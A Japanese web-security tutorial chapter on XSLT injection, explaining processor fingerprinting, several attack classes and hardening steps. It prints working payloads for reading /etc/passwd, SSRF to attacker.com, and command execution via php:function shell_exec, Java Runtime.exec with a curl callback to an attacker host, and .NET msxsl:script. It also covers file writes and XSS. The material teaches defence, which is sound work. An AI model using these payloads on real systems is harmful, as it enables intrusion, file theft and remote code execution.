- **XSLTプロセッサ（変換エンジン）**: ソースXMLとスタイルシートを受け取り、規則に従って出力を生成するライブラリ／エンジン。

重要なのは、**XSLTは単なるテンプレート言語ではなく、チューリング完全に近い「プログラミング言語」**だという点です。変数、条件分岐、ループ、関数呼び出しを持ち、さらに多くの実装では「拡張関数（extension functions）」を通じてホスト言語（PHP、Java、C#など）のネイティブ関数を呼び出せます。ここがインジェクションの温床になります。

典型的なスタイルシートの骨格は次のようになります。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html>
      <body>
        <h1><xsl:value-of select="/catalog/book/title"/></h1>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

`<xsl:value-of select="..."/>` は「XPath式を評価してその結果を出力に埋め込む」命令です。この`select`属性に渡すXPath式が**sink（入力が最終的に実行・解釈される危険な代入先）**であり、攻撃者がここを制御できると多彩な攻撃に発展します。

> 出典: XSLT Injection — https://www.acunetix.com/vulnerabilities/web/xslt-injection/
> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### 脆弱性の発生条件 — なぜインジェクションになるのか

XSLTインジェクションは、**攻撃者が制御できるデータがXSLTスタイルシートの一部として、あるいはスタイルシートそのものとしてプロセッサに渡る**ときに成立します。Acunetixはこれを次のように定義しています。

> ユーザ供給の入力がXSLTの処理内容を制御するとき脆弱性が生じる。これによって攻撃者はスタイルシート変換を操作でき、不正アクセスやデータ改ざんにつながりうる。

典型的な脆弱パターンは次の2種類です。

1. **スタイルシート自体をユーザが指定・投稿できる**: レポート生成機能やドキュメント変換APIで、ユーザがアップロードしたXSLをそのまま変換に使う。
2. **スタイルシート内に動的にユーザ入力を埋め込んでいる**: サーバ側でXSLテンプレートを文字列結合で組み立てており、その中に未検証の値を差し込んでいる（SQLインジェクションと同じ「文字列連結が生む構文混入」構造）。

どちらの場合も、攻撃者が投入したXSLタグをプロセッサが**そのまま変換命令として解釈・実行**してしまう点が本質です。HackTricksは「**攻撃者が制御するXSLタグがサーバ側に保存され、その後アクセスされることで不正操作が可能になる**」と説明しています。

CWE分類は**CWE-91（XML内の特殊要素の不適切な無害化 = XML injection）**で、深刻度はCVSS 3.0で9.1（Critical）とされています。機密性・完全性への影響がともに「高」である一方、可用性への直接影響は「なし」と分類されています。

> 出典: XSLT Injection — https://www.acunetix.com/vulnerabilities/web/xslt-injection/

### プロセッサの種類とバージョン依存性

XSLTインジェクションで**何ができるか**は、使われているプロセッサの実装とバージョンに強く依存します。攻撃者がまずプロセッサを特定（フィンガープリンティング）するのはこのためです。主要な実装は次の3系統です。

- **Libxslt**（GNOMEプロジェクト）: C言語製。PHPの`XSLTProcessor`クラスが内部で使用。EXSLT拡張や`php:function`をサポートするため、PHP環境での攻撃面が広い。
- **Xalan**（Apache）: Java製。Javaのクラスをネームスペース経由で呼び出せるため、RCEにつながりやすい。
- **Saxon**（Saxonica）: Java製。XSLT 2.0/3.0を実装する事実上の標準。Java拡張関数を持つ。

加えて**.NET/Microsoft**の`System.Xml.Xsl`（MSXML/XslCompiledTransform）が独立した系統として存在します。

XSLTには**バージョン1・2・3**があり、最も普及しているのはバージョン1です。バージョン2以降でしか使えない機能（`unparsed-text()`、`xsl:result-document`など）があるため、バージョンの見極めも攻撃可否を左右します。

> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### フィンガープリンティング — プロセッサとバージョンの特定

XSLTには標準関数`system-property()`があり、プロセッサのバージョンやベンダー名を返します。これを出力させることで実装を特定できます。

```xml
<xsl:value-of select="system-property('xsl:version')"/>
<xsl:value-of select="system-property('xsl:vendor')"/>
<xsl:value-of select="system-property('xsl:product-name')"/>
```

- `xsl:version` は `1.0` / `2.0` / `3.0` のようなサポートバージョンを返す。→ バージョン2以降専用機能が使えるか判断できる。
- `xsl:vendor` は `libxslt` / `SAXON` / `Apache Software Foundation` などベンダー名を返す。→ どの拡張関数を試すか決まる。
- `xsl:product-name` は製品名を返す（実装により未対応）。

**なぜこれで判別できるのか**: `system-property()`はXSLT仕様が定める標準関数で、引数にプロセッサ内部のメタ情報名を取り、その値を返します。ベンダーは自身を識別するプロパティを実装しているため、出力を見るだけで裏で動くエンジンが判明します。特定後の戦略は次のとおりです。

- **libxslt/GNOME**: `document()`、`exsl:document`、`php:function()` を試す。
- **Saxon**: `unparsed-text()`、`xsl:result-document`、Java拡張を試す。
- **Xalan**: `http://xml.apache.org/xalan/java` などのJavaネームスペースを試す。
- **.NET/Microsoft**: `document()` と `msxsl:script` を試す。

> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### 攻撃1: ローカルファイル読み取り

最も基本的かつ影響の大きい攻撃です。複数の経路があり、プロセッサに応じて使い分けます。

#### `document()` 関数を使う

`document()`はXSLTの標準関数で、本来は「外部XMLを読み込んで変換に組み込む」ためのものです。

```xml
<xsl:value-of select="document('/etc/passwd')"/>
```

**なぜファイルが読めるのか**: `document()`はURI（ファイルパスやURL）を引数に取り、その場所のリソースをフェッチしてノードツリーとして返します。パスにローカルファイルを指定すれば、プロセッサはそのファイルをネットワーク／ファイルシステムから取得します。ただし`document()`は**取得内容をXMLとしてパースしようとする**ため、`/etc/passwd`のような非XMLファイルはパースエラーになり、そのままでは読めないことが多い点に注意が必要です（HackTricksも「`document()`は妥当なXMLを期待するため、非XMLファイルはパースに失敗しうる」と明記）。

#### `unparsed-text()` を使う（XSLT 2.0以降 / Saxon・libxslt）

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
```

**なぜ非XMLでも読めるのか**: `unparsed-text()`はXSLT 2.0で導入された関数で、その名のとおり**対象をパースせずプレーンテキストとして丸ごと読み込む**ためのものです。第2引数でエンコーディングを指定します。`document()`と違いXML妥当性を要求しないので、`/etc/passwd`や設定ファイル、ソースコードなど任意のテキストファイルを読み出せてしまいます。これが2.0系プロセッサでファイル読み取りに最適な理由です。

#### PHP拡張関数を使う（libxslt + PHP）

```xml
<xsl:value-of select="php:function('file_get_contents','/path/to/file')"/>
```

**なぜPHP関数が呼べるのか**: PHPの`XSLTProcessor`は`registerPHPFunctions()`が有効な場合、XSLT内から`php:function`ネームスペースを通じて**任意のPHP関数を呼び出せる**ようになります。`file_get_contents()`はXML妥当性を一切気にせずファイル内容を文字列で返すため、確実な読み取り手段になります。これは後述するRCEへの入り口でもあります。

#### XXEと組み合わせる

スタイルシート自体もXML文書なので、DOCTYPE宣言を仕込めば従来のXXEも成立します。

```xml
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
<xsl:template match="/">&ext_file;</xsl:template>
```

**なぜ有効か**: スタイルシートをロードする際、プロセッサはこれをXMLとしてパースします。その過程で外部実体`ext_file`が`/etc/passwd`を指すよう定義され、`&ext_file;`の参照箇所に展開されます。**XXE対策はソースXMLのパーサにだけ施され、スタイルシートのパーサには施されていない**ことが多く、この非対称性が攻撃を通します（後述「パーサの非対称性」参照）。

> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### 攻撃2: SSRF・ポートスキャン

`document()`や`xsl:include`はローカルパスだけでなく**URL**も受け付けます。これがそのままSSRF（サーバサイドリクエストフォージェリ）になります。

```xml
<!-- 攻撃者サーバから外部スタイルシートを読み込ませる -->
<xsl:include href="http://attacker.com/external.xsl"/>

<!-- 内部サービスへアクセスさせる -->
<xsl:include href="http://127.0.0.1:8000/xslt"/>

<!-- ポートスキャン: 開いているか応答/エラーの差で判定 -->
<xsl:value-of select="document('http://example.com:22')"/>
```

**なぜSSRFになるのか**: これらの関数はURIスキームを解釈してHTTP等のリクエストをサーバ自身から送出します。攻撃者は宛先を自由に指定できるため、サーバから見て到達可能な内部ネットワーク（`127.0.0.1`、クラウドメタデータエンドポイント、内部管理画面など）へアクセスさせられます。ポートスキャンでは、接続成功・拒否・タイムアウトそれぞれで返るエラーメッセージや応答時間が異なることを利用し、内部ホストの開放ポートを推測できます。`xsl:include`は攻撃者のXSLを丸ごと読み込ませ、より複雑な後続攻撃を注入する足がかりにもなります。

> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### 攻撃3: ディレクトリ一覧（PHP環境）

libxslt + PHPでは、PHPのディレクトリ操作関数を呼び出してファイル一覧を取得できます。

```xml
<xsl:value-of select="php:function('opendir','/path/to/dir')"/>
<xsl:value-of select="php:function('readdir')"/>
```

`scandir()`と`assert()`を組み合わせる手法もあります。

```xml
<xsl:copy-of select="php:function('assert','var_dump(scandir(chr(46).chr(47)))==3')"/>
```

**なぜ動くのか**: `php:function`経由で任意PHP関数が呼べる前提のもと、`opendir`/`readdir`はディレクトリハンドルとエントリ名を返します。`assert()`は歴史的に**引数の文字列をPHPコードとして評価**する（PHP 7.xまでの挙動）ため、`scandir(chr(46).chr(47))`（`chr(46)`は`.`、`chr(47)`は`/`で、つまり`scandir("./")`）が実行され、カレントディレクトリの内容が`var_dump`で出力されます。`chr()`を使うのは、XSLT/XMLコンテキストでスラッシュやドットを直接書くと構文衝突やフィルタに引っかかる場合を回避する定石です。

> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### 攻撃4: リモートコード実行（RCE）

XSLTインジェクションの最悪シナリオです。拡張関数がホスト言語のプロセス起動関数へ到達すると、任意コマンド実行になります。

#### PHP（libxslt）

```xml
<xsl:value-of select="php:function('shell_exec','id')"/>
```

`shell_exec`はシェルコマンドを実行し標準出力を返すため、`php:function`が有効なら一撃でRCEです。

#### Xalan-Java（ブラインドRCE）

```xml
<xsl:variable name="r" select="rt:getRuntime()"/>
<xsl:value-of select="rt:exec($r,'bash -c curl http://attacker/')"/>
```

**なぜJava環境で刺さるのか**: XalanやSaxonはXSLT内から**Javaクラスを直接インスタンス化・呼び出しできる拡張**を持ちます。`rt`ネームスペースを`java.lang.Runtime`にマッピングし、`getRuntime().exec(...)`を呼べば任意プロセスを起動できます。出力がHTTPレスポンスに現れない「ブラインド」な状況でも、`curl`で攻撃者サーバへコールバックさせればコマンド実行を確認できます。

#### Saxon Java拡張

```xml
<xsl:variable name="r" select="rt:getRuntime()"/>
<xsl:value-of select="rt:exec($r,'bash -c id > /tmp/pwned')"/>
```

これはSaxonの設定`ALLOW_EXTERNAL_FUNCTIONS`が有効な場合に成立します。**逆に言えば、この設定を無効化すれば外部Java関数呼び出しを封じられる**という重要な防御ポイントでもあります。

#### .NET `msxsl:script`（.NET Framework限定）

```xml
<msxsl:script language="C#" implements-prefix="user"><![CDATA[
public string run(){System.Diagnostics.Process.Start("cmd.exe","/c ping attacker"); return "ok";}
]]></msxsl:script>
```

**なぜ・どのバージョンで動くのか**: `msxsl:script`はMicrosoftの拡張で、スタイルシート内に**C#/VB.NETのコードを埋め込んで実行**できる機能です。埋め込みコードから`Process.Start`を呼べば任意プログラムを起動できます。ただしこれは**.NET Frameworkのみ**で動作し、**.NET Core 5以降では未サポート**です（スクリプト機能そのものが移植されなかったため）。したがって攻撃可否がランタイム世代に強く依存する典型例で、時事的にはレガシーな.NET Framework環境が狙われます。

> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### 攻撃5: ファイル書き込み

読み取り・実行だけでなく、任意ファイル書き込みも可能です。Webルート配下にWebシェルを書き込めれば、拡張関数が無効でもRCEに至れます。

```xml
<!-- XSLT 2.0: xsl:result-document -->
<xsl:result-document href="local_file.txt">
<xsl:text>Write Local File</xsl:text>
</xsl:result-document>

<!-- libxslt: exsl:document（EXSLT拡張） -->
<exsl:document href="/var/www/html/test.txt" method="text">
0xdf was here!
</exsl:document>

<!-- Xalan-J: redirect拡張 -->
<redirect:open file="local_file.txt"/>
<redirect:write file="local_file.txt">Write Local File</redirect:write>
<redirect:close file="local_file.txt"/>
```

**なぜ書き込めるのか**: これらは本来「変換結果を複数の出力ファイルに分割して書き出す」ための正当な機能（secondary output / multiple output documents）です。`xsl:result-document`はXSLT 2.0標準、`exsl:document`はEXSLT拡張、`redirect`はXalan独自拡張です。`href`/`file`属性に任意パスを渡せるため、Webルートや起動スクリプトの場所に攻撃者制御のコンテンツを書き込めてしまいます。

なお、これらのペイロードをXML内に生成する際は**URLエンコードではなくXMLエンコード（`&`は`&amp;`）を使う**必要があります。これはペイロードがXML文書の一部として解釈されるためで、URLエンコードすると`%26`のような文字列がそのままリテラルになり意図どおり動きません。

> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### 攻撃6: XSS（変換出力がHTMLの場合）

XSLTの出力がそのままブラウザに返るHTMLなら、スクリプトを注入できます。

```xml
<xsl:template match="/">
<script>confirm("XSS");</script>
</xsl:template>
```

**なぜXSSになるのか**: XSLTの主用途のひとつはXML→HTML変換です。攻撃者がテンプレートに`<script>`を混入させると、それが変換結果のHTMLにそのまま出力され、被害者のブラウザで実行されます。サーバサイドの変換結果がクライアントに配信される構成では、XSLTインジェクションはXSSの供給源にもなります。

> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### パーサの非対称性 — XXE対策済みでもXSLTが刺さる理由

本節の冒頭で触れた最重要ポイントです。HackTricksは次の観点を強調しています。

> アプリケーションによっては、入力XMLのパースを堅牢化する一方でXSLTプロセッサは無防備なまま放置している。XXEが失敗する場合でも、プロセッサ固有の関数（`system-property()`、`document()`）や拡張関数・EXSLT要素を試す。`xsl:import`/`xsl:include`はアクセス制御フックより前にパースされる点にも注意。

**なぜこの非対称が生まれるのか**: 多くの開発者は「XMLの脅威 = XXE」と捉え、ソースXMLをパースするパーサに対してのみ`FEATURE_SECURE_PROCESSING`やDTD無効化などのハードニングを施します。しかしXSLT変換は**別のコンポーネント（変換エンジン）**が担い、そこには同じ防御が適用されていないことが多いのです。結果として、ソースXMLでXXEが弾かれても、スタイルシート側から`document()`やEXSLT関数を使えば同等以上の攻撃が通ります。さらに`xsl:import`/`xsl:include`は変換処理の**アクセス制御チェックより前の段階**でリソースを読み込むため、後段のフックでは止められないケースがあります。この「守る場所を1箇所間違えると全体が破れる」構造こそ、XSLTインジェクションを理解すべき理由です。

> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### 防御 — XSLTプロセッサを安全に構成する

Acunetixの公式ガイダンスは端的に「**XSLTプロセッサを再構成してこれらの攻撃から保護せよ**」です。具体化すると次のとおりです。

#### 1. 信頼できないスタイルシートを処理しない（最重要）

そもそも**ユーザ供給のXSLをプロセッサに渡さない**のが根本対策です。変換ロジックはサーバ側で固定し、ユーザにはデータ（ソースXML）だけを渡させる設計にします。SQLインジェクションで「クエリ構造を固定しユーザ値だけをパラメータ化する」のと同じ発想です。

#### 2. 拡張関数・スクリプトを無効化する

- **PHP/libxslt**: `XSLTProcessor::registerPHPFunctions()`を呼ばない。呼ぶ場合も許可する関数を限定する（PHP 5.4+では引数で許可リストを渡せる）。`shell_exec`や`file_get_contents`が呼べない状態にする。
- **Java/Saxon**: `ALLOW_EXTERNAL_FUNCTIONS`を無効化し、`rt:getRuntime()`のようなJavaリフレクション経由の呼び出しを封じる。
- **Java/JAXP全般**: `TransformerFactory`に`FEATURE_SECURE_PROCESSING`を有効化し、`XMLConstants.ACCESS_EXTERNAL_DTD`・`ACCESS_EXTERNAL_STYLESHEET`を空文字（`""`）に設定して外部リソース参照を禁止する。
- **.NET**: `XsltSettings.EnableScript`と`EnableDocumentFunction`を`false`のままにする（既定は無効）。信頼できないスタイルシートでは絶対に有効化しない。

#### 3. 外部リソースアクセスを遮断する

`document()`・`xsl:include`・`xsl:import`が外部URI／ローカルファイルへアクセスできないよう、プロセッサのリソースリゾルバ（`URIResolver`など）を制限し、ネットワークegressやファイルシステムアクセスを最小権限に絞ります。これはSSRF・ファイル読み取り・リモートスタイルシート読み込みを一括で塞ぎます。

#### 4. 入力の検証とサンドボックス化

スタイルシートに動的値を埋め込む設計を避けられない場合は、値を厳格に検証し、XML特殊文字を適切にエスケープします。加えて変換処理を**最小権限のサンドボックス**（限定ユーザ、seccomp/コンテナ、ネットワーク遮断）で実行し、万一の突破時の被害を封じ込めます。

#### 5. XXE対策と「同じ守りをXSLT側にも」適用する

前節の非対称性を踏まえ、ソースXMLパーサに施したDTD無効化・外部実体禁止と**同等の防御をスタイルシートのパーサと変換エンジンの双方に**適用します。守る場所の抜けをなくすことが要点です。

> 出典: XSLT Injection — https://www.acunetix.com/vulnerabilities/web/xslt-injection/
> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### まとめ

- XSLTインジェクションは、XMLを別形式へ変換する**変換エンジン**を攻撃者が操る脆弱性（CWE-91、CVSS 3.0で9.1相当のCritical）。
- 影響はプロセッサ（libxslt/Xalan/Saxon/.NET）とバージョン（XSLT 1/2/3、.NET Framework vs Core）に強く依存するため、攻撃者は`system-property()`でフィンガープリントする。
- 主な攻撃は、**ファイル読み取り**（`unparsed-text()`・`document()`・`php:function`・XXE）、**SSRF/ポートスキャン**（`document()`・`xsl:include`）、**ディレクトリ一覧**、**RCE**（`php:function('shell_exec')`・Java `Runtime.exec`・.NET `msxsl:script`）、**ファイル書き込み**（`xsl:result-document`・`exsl:document`・`redirect`）、そして出力HTML経由の**XSS**。
- 最大の教訓は**パーサの非対称性**: XXE対策をソースXMLだけに施し、スタイルシート／変換エンジンを無防備に放置すると全体が破れる。
- 防御の核心は「信頼できないXSLを処理しない」「拡張関数・スクリプト・外部リソースアクセスを無効化する」「XXE対策を変換エンジン側にも徹底する」こと。


---

[← 第4章 XMLを解釈する各種ファイル形式経由のXXE](04-file-format-xxe.md) ｜ [目次](index.md) ｜ [第6章 ファイルアップロード脆弱性の基礎 →](06-file-upload-basics.md)
